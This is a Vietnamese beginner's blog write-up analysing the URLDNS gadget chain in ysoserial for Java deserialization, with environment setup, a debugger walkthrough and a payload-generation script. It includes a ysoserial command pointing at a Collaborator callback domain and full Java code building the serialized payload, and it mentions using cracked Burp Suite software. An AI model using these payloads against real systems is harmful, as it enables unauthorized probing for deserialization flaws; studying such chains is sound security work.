---
title: Java deserialize, gadget chain URLDNS - ysoserial
date: 2025-07-30 00:00:00 +0007
categories: [Analysis]
tags: [deserialization, java, ysoserial]

description: "A beginner's write-up on Java deserialization about setting up the environment and exploring the URLDNS gadget chain in ysoserial with debugging and payload analysis."

---


## Overview about gadget chain URLDNS

Vì là một người mới học, trước khi đi vào phân tích sâu mình cũng có tìm hiểu xem cái nào sẽ phù hợp nhất với bản thân. Có vẻ như ngoài bộ Common Collections thì URLDNS cũng được biết tới với một chain beginner-friendly, vậy nên mình đã chọn cái này làm cái đầu tiên để tập debug và hiểu cách họ xây payload

Về chain URLDNS:
- Là một chain tạo DNS request chứ không phải RCE
- Để reproduce chain này thì chỉ cần có sẵn các class và method built-in của JDK, vì vậy nên đây thường là một chain được sử dụng để xác định rằng target có khả năng dính Java Deser hay không (they said)

## Set up env
- **Repo ysoserial:** https://github.com/frohoff/ysoserial
- **IDE:** **Intellij**, activated by student license
- **JDK ver 8u202:** https://mirrors.huaweicloud.com/java/jdk/8u202-b08/

Vì chắc hẳn ai cũng có nhiều phiên bản Java khác nhau trong máy, cần chỉ định cho Intellij sử dụng phiên bản chính xác mà mình mong muốn, phím tắt **`Ctrl Alt Shift S`** hoặc `Right click vào tên Project, chọn Open Module Setting`

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image1.png" | relative_url }})

Như đã nói trong phần tổng quan, đây là một chain trigger DNS request, nên ta cần chỉ định nơi sẽ nhận những tín hiệu này, ta có thể sử dụng Burp Collaborator hoặc những thứ có sẵn trên mạng khác. Ở đây mình sử dụng **https://requestrepo.com**

Góc trên bên phải cạnh icon `run code`, ta chọn edit configuration

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image2.png" | relative_url }})

Tiến hành add thêm 1 application vào với 2 setting quan trọng ở mục build and run như sau:
- **file run:** Ta để ysoserial.payloads.URLDNS
- **DNS lookup domain:** Burp collaborator hoặc một dns server khác

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image3.png" | relative_url }})

Sau khi hoàn thành các công đoạn trên, ta có thể **`Shift F10`** để run code. Nếu requestrepo đã bắt được req thì ta đã set up môi trường để phân tích chain URLDNS thành công

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image4.png" | relative_url }})

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image5.png" | relative_url }})

## Debug chain

Đến với cái nhìn đầu tiên, ta biết được sơ đồ chain này sẽ bao gồm:

```
HashMap.readObject()
    ->HashMap.putVal()
        ->HashMap.hash()
            ->URL.hashCode()
```

Ở đây, để tiện lợi cho từ nay về sau thì mình sẽ sử dụng maven để tạo file executable JAR theo manual của họ, sau này muốn sử dụng sẽ chỉ cần **`java -jar ysoserial.jar`**

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image6.png" | relative_url }})

Ban đầu, mình vẫn để powershell sử dụng jdk22 (vì crack burpsuite prof nên phải dùng bản này =))) ) và maven 3.9.11 để download, kết quả ra 1 đống bug do ysoserial sử dụng các bản khá cũ. Sau khi nhận ra, mình tìm cách tạo biến môi trường tạm để sử dụng jdk 8u202, cụ thể

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image7.png" | relative_url }})

```
// powershell
$env:JAVA_HOME="C:\Program Files\Java\jdk1.8.0_202"
$env:Path="$env:JAVA_HOME\bin;$env:Path"

// cmd (nhát nữa sẽ dùng hẹ hẹ)
set JAVA_HOME=C:\Program Files\Java\jdk1.8.0_202
set PATH=%JAVA_HOME%\bin;%PATH%
```

Đổi phiên bản jdk8u202 này

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image8.png" | relative_url }})

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image9.png" | relative_url }})

Success ngay, giờ đến chuyên mục dùng tool thay vì cài đặt. Tiến hành sử dụng command tạo một payload của chain URLDNS như sau:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://2ilsbxuzqilyhcldvytrfbzzwq2hq7ew.oastify.com" > payload.ser
```

Và bất ngờ tới khi mình base64 nội dung file payload.ser, mình không hề thấy tiền tố **`r0O`** ở đầu, điềm báo cho một lần khổ dâm tiếp theo

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image10.png" | relative_url }})

Sau một hồi đi tìm hiểu lý do, mình mới biết không phải do version của jdk, mvn hay do mình build ysoserial sai mà do cách thằng powershell ghi file dữ liệu nhị phân với toán tử >, và mình quyết định chuyển sang cmd để dùng tool

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image11.png" | relative_url }})

---

Một vài điểm trước mắt về bộ tool ysoserial và IDE Intellij mình nhận ra trong quá trình làm:
- Khi set up configuration cố định như case này, thì intellij nó sẽ phi thẳng vào file được chỉ định và thực thi hàm main 
- ysoserial spam 1 hàm main format gần như tương tự nhau, cụ thể nó sử dụng một cái class tự chế PayloadRunner, trong đó đã bao gồm cả việc ser và deser dữ liệu. Chỉ là mỗi chain thì tham số truyền vào khác nhau

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image12.png" | relative_url }})


Ok tiếp theo để debug chính xác, mình sẽ tiến hành đặt breakpoint tại tất cả các class, method được đề cập tới trong sơ đồ chain. Sử dụng tổ hợp `Ctrl N` để tìm kiếm tên class, sau đó có thể `Ctrl F` hoăc `Ctrl F12` để tìm method

Đầu tiên là `readObject()` của HashMap, vì mới chỉ là call deser kích hoạt nên mình sẽ đi sâu vào trong method này, cụ thể trong method này ở dòng 1413 có gọi đến method `putVal()`

method `putval()` lại gọi method `hash` với tham số truyền vào là key, hiện tại giá trị của key đang là URL domain mà ta truyền vào ban đầu

Nơi khai báo method `hash()` là class HashMap

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image13.png" | relative_url }})

Khi này ta có thể giá trị key khác null, cụ thể là vẫn đang nhận URL truyền vào. Khi đó toán tử ba ngôi kia sẽ rơi vào nhánh return có gọi tới một method nữa `key.hashCode()`

Hiện tại, key đang là một object, cụ thể là một instance của class URL => Gọi method `hashCode()` của URL

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image14.png" | relative_url }})

Sau khi đặt breakpoint và nhảy đến, có thể thấy hiện giá trị của hashcode đang là -1. Nhưng cũng không phải tự nhiên mà giá trị của hashCode bằng -1 , đừng quên trong code exploit chúng ta đã sử dụng Reflection API để set giá trị cho nó, vì vậy chắc chắn ở step này hashcode sẽ là -1

```java
Reflections.setFieldValue(u, "hashCode", -1);
```

Sau đó ta sẽ đi vào nhánh dưới, giá trị của hashCode khi này sẽ trở thành `handler.hashCode(?)` với tham số truyền vào vẫn là object URL

Tiếp tục sử dụng trò `Jump to Type source`, ta biết được handler là một instance của class Handler, được kế thừa từ class URLStreamHandler

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image15.png" | relative_url }})

Đặt bp và nhảy tới URLStreamHandler, ta có thể thấy method hashCode hiện tại đang làm mấy trò như `getProtocol`, `getHostAddress`

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image16.png" | relative_url }})

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image17.png" | relative_url }})

`getProtocol` không có gì vui, nên mình sẽ nhảy tới thằng method `getHostAddress` thì trong method này lại gọi tới một thằng nữa là `getByName`

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image18.png" | relative_url }})

![image]({{ "/assets/img/2025-08-02-Debug-URLDNS/image19.png" | relative_url }})

Theo doc của oracle, thằng method `getByName` sẽ có tác dụng: "Determines the IP address of a host, given the host's name". Tức phương thức này nó sẽ trả về địa chỉ IP tương ứng với tên miền mà chúng ta đưa vào. 

**Mặc dù tài liệu này cũng không chỉ rõ, nhưng thông qua kiến thức mạng máy tính ta có thể ngầm hiểu, để làm được việc nhận vào 1 tên miền rồi return IP đó chắc chắn sẽ phải gửi một yêu cầu tới DNS resolver để hỏi xem IP của thằng host này là gì => Gửi DNS request => Sink ta cần tìm**

---

Tóm lại, để đầy đủ hơn thì flow của chain URLDNS có thể được diễn tả như này. Vì theo mình, putVal và hash trong HashMap gần như là một, chỉ sử dụng hash là chính, hơn hết cách mô tả của ysoserial đã bỏ qua các method ở giữa quá trình nữa
```
HashMap.readObject()
    HashMap.hash()
        URL.hashCode()
            URLStreamHandler.hashCode()
                URLStreamHandler.getHostAddress()
                    InetAddress.getByName()
```

Mặc dù sau khi debug qua code exploit của họ mình cũng hiểu những gì họ đã làm nhưng để ngồi tự code lại script exploit này thì mình cảm thấy hiện tại vẫn chưa làm được =)) Script tạo payload cụ thể là

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String [] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        HashMap hm = new HashMap();
        URL u = new URL("ur domain here");

        Field field = URL.class.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u, 123);

        hm.put(u, 1);
        field.set(u, -1);
        
        Serialize(hm);
        Deserialize();
    }

    public static void Serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream("test.txt");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }

    public static void Deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream("test.txt");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
    }
}
```

## References
> Là một người mới học java lẫn java deser, mình muốn cảm ơn mọi người về những bài viết public này, chúng đã giúp đỡ mình rất nhiều
- **[https://sec.vnpt.vn/2020/02/co-gi-ben-trong-cac-gadgetchain](https://sec.vnpt.vn/2020/02/co-gi-ben-trong-cac-gadgetchain)**
- **[https://big-jackrabbit-e32.notion.site/Java-Reflection-1f6903997370802bb059fde698d3a443#20290399737080a89684da4ea146bc65](https://big-jackrabbit-e32.notion.site/Java-Reflection-1f6903997370802bb059fde698d3a443#20290399737080a89684da4ea146bc65)**
- **[https://hackmd.io/@endy/r1sYTUYOh#URLDNS](https://hackmd.io/@endy/r1sYTUYOh#URLDNS)**
- **[https://sheon.hashnode.dev/java-security-2-phan-tich-urldns-chain-ysoserial#heading-setup-moi-truong](https://sheon.hashnode.dev/java-security-2-phan-tich-urldns-chain-ysoserial#heading-setup-moi-truong)**
- **[https://viblo.asia/p/insecure-deserialization-vulnerability-cac-lo-hong-insecure-deserialization-phan-5-x7Z4DNg0LnX](https://viblo.asia/p/insecure-deserialization-vulnerability-cac-lo-hong-insecure-deserialization-phan-5-x7Z4DNg0LnX)**